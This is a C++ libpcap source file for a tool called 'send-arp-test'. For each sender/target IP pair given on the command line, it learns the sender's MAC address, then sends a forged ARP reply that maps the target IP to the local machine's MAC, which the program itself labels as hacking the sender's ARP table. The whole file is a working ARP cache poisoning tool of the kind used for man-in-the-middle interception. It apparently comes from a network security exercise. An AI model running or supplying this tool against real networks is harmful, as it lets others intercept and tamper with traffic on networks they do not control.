#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include "src/ethhdr.h"
#include "src/arphdr.h"

#define ETHER_ADDR_LEN 6
#define ETHER_HDR_LEN 14
#define ETH_ALEN 6
#define IP_LEN 4

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct libnet_ethernet_hdr
{
	u_int8_t  ether_dhost[ETHER_ADDR_LEN];/* destination ethernet address */
	u_int8_t  ether_shost[ETHER_ADDR_LEN];/* source ethernet address */
	u_int16_t ether_type;                 /* protocol */
};

struct arp_ether_ipv4{
	u_int16_t htype;   /* Format of hardware address */
	u_int16_t ptype;   /* Format of protocol address */
	u_int8_t hlen;    /* Length of hardware address */
	u_int8_t plen;    /* Length of protocol address */
	u_int16_t op;    /* ARP opcode (command) */
	u_int8_t smac[ETH_ALEN];  /* Sender hardware address */
	u_int8_t sip[IP_LEN];   /* Sender IP address */
	u_int8_t tmac[ETH_ALEN];  /* Target hardware address */
	u_int8_t tip[IP_LEN];   /* Target IP address */
} ;

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void getMyMACaddress(char* interface, char* macBuf)
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_name, interface);
	if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
		memcpy(macBuf, s.ifr_addr.sa_data, 6);
	}

}

void getMyIPaddress(char* interface, char* ipBuf)
{
	struct ifreq ifr; 
	char ipstr[40];
	int s;
	s = socket(AF_INET, SOCK_DGRAM, 0);
	strcpy(ifr.ifr_name, interface);
	if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
	{
		printf("Error");
	}
	else
	{
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
		//printf("myOwn IP Address is %s\n", ipstr);
		memcpy(ipBuf, ipstr, strlen(ipstr));
	}
}

int sendArpPacket(char *device, pcap_t* handle, char* eth_dmac, char* eth_smac, int isRequest, char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip)
{	
	EthArpPacket packet;
	//printf("%s \n", eth_dmac);
	//printf("%s \n", eth_smac);
	packet.eth_.dmac_ = Mac(eth_dmac); //sender's MAC address
	packet.eth_.smac_ = Mac(eth_smac); //My MAC address
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(isRequest?ArpHdr::Request:ArpHdr::Reply); // REPLY
	packet.arp_.smac_ = Mac(arp_smac); // My MAC address
	packet.arp_.sip_ = htonl(Ip(arp_sip)); // target ip address
	packet.arp_.tmac_ = Mac(arp_tmac); // You's MAC address
	packet.arp_.tip_ = htonl(Ip(arp_tip)); // You's IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	
	return 0;
}

void print_bytes(u_int8_t* bytes, size_t num)
{
	for (size_t i = 0; i < num; i++)
		printf("%2X ", bytes[i]);
}

int getMACwithIP(char* inputIP, char* myMACaddress, char* myIPaddress, char *device, pcap_t* handle, char* macBuf)
{
	char eth_dmac[18] = "ff:ff:ff:ff:ff:ff";
	char* eth_smac = myMACaddress;
	int isRequest = 1;
	char* arp_smac = myMACaddress;
	char* arp_sip = myIPaddress;
	char arp_tmac[18] = "00:00:00:00:00:00";
	char* arp_tip = inputIP;
	
	if (sendArpPacket(device, handle, eth_dmac, eth_smac, isRequest, arp_smac, arp_sip, arp_tmac, arp_tip) == -1)
		return -1;

	int count = 0;
	while (true) {
		count += 1;
		if (count >= 100)
		{
			if (sendArpPacket(device, handle, eth_dmac, eth_smac, isRequest, arp_smac, arp_sip, arp_tmac, arp_tip) == -1)
				return -1;
				
			count = 0;
		}
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ethernetVar;
		struct arp_ether_ipv4* arpVar;
		const u_char* packet;
		char sip[16] = {};
		
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		ethernetVar = (struct libnet_ethernet_hdr*)(packet);
		if (ntohs(ethernetVar->ether_type) != 0x0806) continue;
		arpVar = (struct arp_ether_ipv4*)(packet + ETHER_HDR_LEN);
		
		sprintf(sip, "%d.%d.%d.%d", arpVar->sip[0], arpVar->sip[1], arpVar->sip[2], arpVar->sip[3]);
		
		if(strcmp(sip, inputIP) == 0)
		{
			sprintf(macBuf, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx", ethernetVar->ether_shost[0], ethernetVar->ether_shost[1], ethernetVar->ether_shost[2], ethernetVar->ether_shost[3], ethernetVar->ether_shost[4], ethernetVar->ether_shost[5]);
			break;
		}
	}
		
	return 0;
}

int main(int argc, char* argv[]) {

	if (argc < 4 || argc%2==1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	char* senderIP;
	char* targetIP;
	char myMACaddress[6] = {};
	char myMACaddressWithColon[18] = {};	
	char myIPaddress[16] = {};
	char senderMACaddressWithColon[18] = {};	
	
	printf("Getting My MAC address\n");
	getMyMACaddress(dev, myMACaddress);
	sprintf(myMACaddressWithColon, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",myMACaddress[0], myMACaddress[1], myMACaddress[2], myMACaddress[3], myMACaddress[4], myMACaddress[5]);
	
	printf("Getting My IP address\n");
	getMyIPaddress(dev, myIPaddress);

	int i = (argc-2)/2;
	for(i = 0; i < (argc-2)/2;i++)
	{
		senderIP = argv[2+i*2];
		targetIP = argv[3+i*2];
		printf("Getting Sender's(%s) MAC address\n", senderIP);
		if (getMACwithIP(senderIP, myMACaddressWithColon, myIPaddress, dev, handle, senderMACaddressWithColon) == -1)
			return -1;
			
		printf("Hacking Sender's(%s) ARP table\n", senderIP);
		if (sendArpPacket(dev, handle, senderMACaddressWithColon, myMACaddressWithColon, false, myMACaddressWithColon, targetIP, senderMACaddressWithColon, senderIP) == -1)
			return -1;
	}	
	pcap_close(handle);
}
